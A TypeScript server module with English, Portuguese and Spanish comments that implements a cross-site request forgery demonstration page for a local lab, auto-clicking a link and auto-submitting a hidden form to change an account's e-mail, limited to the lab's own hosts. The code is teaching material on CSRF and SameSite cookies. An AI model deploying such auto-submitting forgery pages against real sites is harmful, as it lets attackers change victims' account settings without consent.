// ============================================================================================
// EN: THE LAB'S FORGING PAGE. This is the "other site" of the experiment: a second origin that
//     makes the visitor's browser send a request to the lab app. It can only target the app
//     containers of this compose file (see LAB_APP_HOSTS), with one fixed fake e-mail. It is a
//     demonstration, not a tool: do not copy it or point it at anything else.
// PT: A PÁGINA FORJADORA DO LABORATÓRIO. Este é o "outro site" do experimento: uma segunda
//     origem que faz o navegador do visitante enviar uma requisição ao app do laboratório. Ela
//     só consegue atingir os contêineres de app deste compose (veja LAB_APP_HOSTS), com um
//     e-mail falso fixo. É uma demonstração, não uma ferramenta: não a copie nem a aponte para
//     nenhum outro lugar.
// ES: LA PÁGINA FALSIFICADORA DEL LABORATORIO. Este es el "otro sitio" del experimento: un segundo
//     origen que hace que el navegador del visitante envíe una solicitud a la app del laboratorio. Solo
//     puede alcanzar los contenedores de app de este compose (ve LAB_APP_HOSTS), con un
//     correo falso fijo. Es una demostración, no una herramienta: no la copies ni la apuntes a
//     ningún otro lugar.
// ============================================================================================
import { type AnyElysia, Elysia } from "elysia";
import { z } from "zod";
import { appUrl, FORGED_EMAIL, LAB_APP_HOSTS } from "../shared/config";
import { escapeHtml, htmlResponse, textResponse } from "../shared/http";

// EN: The target is a key from a closed list, never a free URL.
// PT: O alvo é uma chave de uma lista fechada, nunca uma URL livre.
// ES: El objetivo es una clave de una lista cerrada, nunca una URL libre.
const targetSchema = z.object({ target: z.enum(LAB_APP_HOSTS) });

const BANNER = "LAB FORGING PAGE: local demonstration, targets only this lab's own containers.";

function page(body: string): Response {
	return htmlResponse(`<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Lab forging page</title>
</head>
<body>
<h1>${escapeHtml(BANNER)}</h1>
${body}
</body>
</html>
`);
}

export function createForgingPageApp(): AnyElysia {
	return (
		new Elysia()
			.get("/health", () => textResponse("ok", 200))
			.get("/", () =>
				page(`<p>Paths: <code>/forge/get?target=HOST</code> and <code>/forge/post?target=HOST</code>.</p>
<p>Allowed hosts: ${LAB_APP_HOSTS.map((host) => `<code>${escapeHtml(host)}</code>`).join(", ")}.</p>`),
			)
			// EN: Forgery by GET. The page "clicks" a link to the app. For the browser this is an
			//     ordinary top-level navigation started by another site, exactly like a link in a
			//     search result, and that is why even `SameSite=Lax` cookies go along with it.
			// PT: Forja por GET. A página "clica" em um link para o app. Para o navegador isto é
			//     uma navegação de nível superior comum iniciada por outro site, exatamente como
			//     um link em um resultado de busca, e é por isso que até cookies `SameSite=Lax`
			//     vão junto.
			// ES: Falsificación por GET. La página "hace clic" en un enlace hacia la app. Para el navegador esto es
			//     una navegación de nivel superior común iniciada por otro sitio, exactamente como
			//     un enlace en un resultado de búsqueda, y por eso incluso las cookies `SameSite=Lax`
			//     van incluidas.
			.get("/forge/get", ({ query }) => {
				const parsed = targetSchema.safeParse(query);
				if (!parsed.success) {
					return textResponse("Unknown target: only the hosts of this lab are allowed.", 400);
				}
				const href = `${appUrl(parsed.data.target)}/email/change?email=${encodeURIComponent(FORGED_EMAIL)}`;
				return page(`<a id="forged-link" href="${escapeHtml(href)}">forged link</a>
<script>document.getElementById("forged-link").click();</script>`);
			})
			// EN: Forgery by POST. A hidden form whose `action` is the app, submitted by script as
			//     soon as the page loads. HTML forms were always allowed to post to other sites, and
			//     the page never sees the answer. It does not need to: the damage is the request.
			// PT: Forja por POST. Um formulário oculto cujo `action` é o app, enviado por script
			//     assim que a página carrega. Formulários HTML sempre puderam enviar para outros
			//     sites, e a página nunca vê a resposta. Nem precisa: o dano é a requisição.
			// ES: Falsificación por POST. Un formulario oculto cuyo `action` es la app, enviado por script
			//     en cuanto carga la página. Los formularios HTML siempre pudieron enviar a otros
			//     sitios, y la página nunca ve la respuesta. Ni lo necesita: el daño es la solicitud.
			.get("/forge/post", ({ query }) => {
				const parsed = targetSchema.safeParse(query);
				if (!parsed.success) {
					return textResponse("Unknown target: only the hosts of this lab are allowed.", 400);
				}
				const action = `${appUrl(parsed.data.target)}/email/change`;
				return page(`<form id="forged-form" method="post" action="${escapeHtml(action)}">
<input type="hidden" name="email" value="${escapeHtml(FORGED_EMAIL)}">
</form>
<script>document.getElementById("forged-form").submit();</script>`);
			})
	);
}
